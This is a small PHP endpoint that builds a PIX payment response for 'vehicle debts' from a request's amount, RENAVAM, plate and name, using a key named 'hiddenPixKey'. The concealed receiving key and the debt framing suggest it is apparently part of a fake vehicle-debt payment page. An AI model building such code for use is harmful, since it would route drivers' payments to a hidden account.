<?php

error_reporting(0);
ini_set('display_errors', '0');
ob_start();

header('Content-Type: application/json; charset=utf-8');

require_once __DIR__ . '/pix_common.php';

try {
    $valor = $_GET['valor'] ?? $_POST['valor'] ?? 0;
    $renavam = trim((string) ($_GET['uc'] ?? $_POST['uc'] ?? ''));
    $placa = trim((string) ($_GET['placa'] ?? $_POST['placa'] ?? ''));
    $nome = trim((string) ($_GET['nome'] ?? $_POST['nome'] ?? ''));
    $descricao = $nome !== '' ? 'Debitos ' . $nome : 'Debitos Veiculo';

    $response = pix_build_response(
        pix_selected_key('hiddenPixKey'),
        $valor,
        $descricao,
        $renavam,
        $placa
    );

    if (ob_get_level() > 0) {
        ob_clean();
    }

    echo json_encode($response, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
} catch (Throwable $e) {
    if (ob_get_level() > 0) {
        ob_clean();
    }

    echo json_encode(['error' => $e->getMessage() ?: 'Falha interna']);
}
